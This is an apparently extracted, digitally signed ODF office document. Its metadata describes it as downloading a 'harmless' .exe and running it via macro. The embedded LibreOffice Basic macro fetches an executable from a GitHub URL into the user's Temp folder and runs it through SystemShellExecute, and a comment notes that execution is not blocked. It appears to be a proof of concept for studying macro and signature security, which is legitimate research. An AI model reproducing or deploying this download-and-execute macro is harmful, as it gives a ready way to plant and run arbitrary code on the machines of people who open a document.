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ocument downloads a harmless .exe file and executes it via macro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2T19:54:29.99</meta:creation-date>
    <dc:date>2021-10-12T19:55:59.23</dc:date>
    <meta:editing-duration>PT1M29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2" meta:word-count="27" meta:character-count="16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	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	Dim oSvc as object
	
  	oSvc = createUNOService("com.sun.star.system.SystemShellExecute")
	oSFA = createUNOService ("com.sun.star.ucb.SimpleFileAccess")
	
	sFilePath = "C:\Users\" + environ("USERNAME") + "\AppData\Local\Temp\odfexample.exe"
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 'if file exists, delete it
	End If
	
	DownloadFile("https://github.com/attodf/odf-test/raw/main/odfexample.exe", sFilePath)
	Beep
	oSvc.execute(ConvertToUrl(sFilePath), "", 0)
	REM No Internet flag is set and thus the execution is not blocked.
	
End Sub

	Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
                       (ByVal pCaller As Long, _
                        ByVal szURL As String, _
                        ByVal szFileName As String, _
                        ByVal dwReserved As Long, _
                        ByVal lpfnCB As Long) As Long
                        

	Public Function DownloadFile (URL As String, LocalFilename As String) As Boolean 
	    Dim lngRetVal As Long
	    lngRetVal = URLDownloadToFile(0, URL, LocalFilename, 0, 0) 
	    If lngRetVal = 0 Then DownloadFile = True 
	End Function ' DownloadFi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0900a900ad008800170020004e000500b900a4006a00670042000d006000fb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egXffgxGA8gWOLd2Bpf5RK+oReo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fe006800fe009d008e00d90041003d00bf0005004700240054005a00d200a3">
        <DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <DigestValue>OyJNv6K2G4J3wRPz0XVAT0MkskQ=</DigestValue>
      </Reference>
    </SignedInfo>
    <SignatureValue>WjJWRY4wN7sQbuvkKCwod0GNHMyktG/Q0Gs48BEMIFnMjBHe0aBJyIeZW7rPm+Lr
c2g+nath5MrQ6yH7F7CK/pReTojmPX1JPGvQRF8Of79UyDiIwvfDvbVufc7IyrUZ
qj3LJrYjY2rrSJYhmbiRm9UAQgqTcIq5mehWpDlONTbbIrXQe4iw6Zq13ciudOW9
YbYblHLnWSaD+X6SDY1Z3wG+a7Nr9vx36m/EXh/t4sHQSjWW8oaboVJurOxZUN64
FzvBzMY1R8qdh84jFPEo6SmCMgfwkdIzkXxPqzLn+dCh2x8XW/URzWV5suN8reqN
GbQBJ76odCKJTSzgBq9Pzg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fe006800fe009d008e00d90041003d00bf0005004700240054005a00d200a3" Target="#ID_000900a900ad008800170020004e000500b900a4006a00670042000d006000fb">
          <dc:date xmlns:dc="http://purl.org/dc/elements/1.1/">2021-10-12T19:56:58,96</dc:date>
        </SignatureProperty>
      </SignatureProperties>
    </Object>
  </Signature>
</document-signatures>
</file>